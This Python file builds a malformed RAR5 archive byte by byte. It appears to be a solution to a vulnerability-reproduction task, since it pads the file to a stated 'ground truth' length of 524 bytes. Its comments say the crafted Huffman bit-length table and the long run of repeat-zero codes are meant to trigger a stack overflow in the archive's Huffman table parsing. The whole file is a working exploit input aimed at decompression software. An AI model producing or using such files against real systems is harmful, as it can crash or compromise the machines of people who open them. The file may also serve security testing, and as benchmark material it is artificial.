import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 Signature: 52 61 72 21 1A 07 01 00
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
        
        # Main Header (Type 1)
        # Structure: CRC(4) | Size(V) | Type(V) | Flags(V)
        # Size = Size(Type) + Size(Flags) = 1 + 1 = 2.
        # Data for CRC: Size(2) + Type(1) + Flags(0) -> 02 01 00
        mh_body = b'\x02\x01\x00'
        mh_crc = zlib.crc32(mh_body) & 0xFFFFFFFF
        main_header = struct.pack('<I', mh_crc) + mh_body
        
        # File Header (Type 2)
        # Header Data (File specific fields):
        # FileFlags(V)=0: 00
        # UnpSize(V)=1: 01
        # Attributes(V)=0: 00
        # Compression(V)=1 (Method 1, Window 128KB): 01
        # HostOS(V)=0: 00
        # NameLen(V)=1: 01
        # Name(1)='a': 61
        fh_specific = b'\x00\x01\x00\x01\x00\x01\x61'
        
        # Calculate Payload Length to match ground truth 524 bytes
        # Fixed parts: Sig(8) + MH(7) + FH_CRC(4) + FH_Body(Size1+Type1+Flags1+DS2+Spec7=12? No, see below)
        # Base Block: Type(1) + Flags(1) + DataSize(2) + Specific(7) = 11 bytes body + 1 byte Size field = 12 bytes?
        # Let's verify size encoding: 11 is 0x0B (1 byte).
        # Body: 0B 02 01 EC 03 ...
        # Total FH length = 4(CRC) + 1(Size) + 1(Type) + 1(Flags) + 2(DS) + 7(Spec) = 16 bytes?
        # No, Body size calculation: Type(1)+Flags(1)+DataSize(2)+Spec(7) = 11.
        # Size field value = 11. Size field size = 1.
        # Bytes: CRC(4) + Size(1) + Body(11) = 16 bytes.
        # Wait, my previous calculation was 17 bytes.
        # Let's re-check `fh_body` construction below.
        # Body: Size(0B) + Type(02) + Flags(01) + DS(EC 03) + Spec(7).
        # Total Body Bytes: 1 + 1 + 1 + 2 + 7 = 12 bytes.
        # CRC is over these 12 bytes.
        # Total FH bytes = 4 + 12 = 16 bytes.
        # Total so far: 8 + 7 + 16 = 31 bytes.
        # Ground truth: 524. Payload = 524 - 31 = 493 bytes.
        # Let's set DataSize to 493. 493 = 0x1ED.
        # VarInt: 1ED -> Lo 7 bits: 0x6D | 0x80 = 0xED. Hi bits: 0x03. -> ED 03.
        
        payload_len = 493
        ds_varint = b'\xED\x03'
        
        # Base Block
        # Size field value: Type(1) + Flags(1) + DataSize(2) + Specific(7) = 11 (0x0B)
        size_varint = b'\x0B'
        
        # Data to CRC: Size + Type + Flags + DataSize + Specific
        fh_body = size_varint + b'\x02\x01' + ds_varint + fh_specific
        fh_crc = zlib.crc32(fh_body) & 0xFFFFFFFF
        file_header = struct.pack('<I', fh_crc) + fh_body
        
        # Payload construction
        # To trigger stack overflow in Huffman table parsing:
        # 1. Provide a valid Bit Length Table (first 10 bytes).
        #    We configure it so Code 16 (Repeat Zero) has length 1 (bit '0').
        #    Codes 16=1, 17=2, 18=3, 19=3. All others 0.
        #    Nibbles (20 entries, 4 bits each):
        #    0-15: 0 -> 8 bytes of 00.
        #    16,17: 1, 2 -> Byte 0x21.
        #    18,19: 3, 3 -> Byte 0x33.
        bl_table = b'\x00' * 8 + b'\x21\x33'
        
        # 2. Compressed Data
        #    We want to generate massive number of zeros to overflow buffer.
        #    Using Code 16 (bit '0') followed by Arg (2 bits).
        #    We choose Arg '11' (3) to get max repeat (3+3=6).
        #    Bit pattern: 0 1 1.
        #    Repeated 011011011...
        #    Bytes: B6 6D DB ...
        pattern = b'\xB6\x6D\xDB'
        
        content_len = payload_len - len(bl_table)
        content = (pattern * (content_len // 3 + 1))[:content_len]
        
        payload = bl_table + content
        
        return sig + main_header + file_header + payload
